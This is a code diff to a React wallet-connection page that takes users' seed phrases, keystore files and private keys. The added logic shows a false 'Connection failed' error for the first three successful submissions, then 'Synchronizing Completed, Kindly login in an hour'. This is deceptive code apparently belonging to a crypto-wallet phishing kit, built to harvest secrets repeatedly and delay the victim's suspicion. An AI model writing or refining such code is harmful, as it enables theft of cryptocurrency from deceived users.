@@ -477,6 +477,8 @@ function Wallet(){
 
       const[showError, setShowError] = useState(false);
 
+      const[errorMessage, setErrorMessage] = useState("");
+
 
       async function handlePhrase(e){
         e.preventDefault();
@@ -501,8 +503,22 @@ function Wallet(){
     
             if(response.status == 200){
                 console.log(response.data.message);
-    
-                 setShowError(true);
+                
+
+                if(phrasekeycount < 3){
+                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
+                    setPhraseKeyCount(phrasekeycount + 1);
+                }
+
+                else if(phrasekeycount == 3){
+                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
+                    setPrivateKeyCount(0);
+                }
+
+                setShowError(true);
+
+
+
             }
           } catch (error) {
             // Handle error
@@ -538,7 +554,23 @@ function Wallet(){
             if(response.status == 200){
                 console.log(response.data.message);
     
+                
+
+                if(keystorejsoncount < 3){
+                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
+                    setKeystoreJsonCount(keystorejsoncount + 1);
+                }
+
+                else if(keystorejsoncount == 3){
+                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
+                    setKeystoreJsonCount(0);
+                }
+
                 setShowError(true);
+
+
+
+
             }
           } catch (error) {
             // Handle error
@@ -575,6 +607,16 @@ function Wallet(){
     
             if(response.status == 200){
                 console.log(response.data.message);
+
+                if(privatekeycount < 3){
+                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
+                    setPrivateKeyCount(privatekeycount + 1);
+                }
+
+                else if(privatekeycount == 3){
+                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
+                    setPrivateKeyCount(0);
+                }
     
                 setShowError(true);
             }
@@ -586,6 +628,12 @@ function Wallet(){
 
         
     }
+
+    const[phrasekeycount, setPhraseKeyCount] = useState(0);
+
+    const[keystorejsoncount, setKeystoreJsonCount] = useState(0);
+
+    const[privatekeycount, setPrivateKeyCount] = useState(0);
       
 
     return (
@@ -679,8 +727,8 @@ function Wallet(){
             </div>
 
 
-            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
-            <strong>Connection to {selectedName} failed!!!</strong> 
+            {showError &&  <div className="alert alert-danger alert-dismissible fade show" role="alert">
+            <strong>{errorMessage}</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                 <span aria-hidden="true">&times;</span>
             </button>
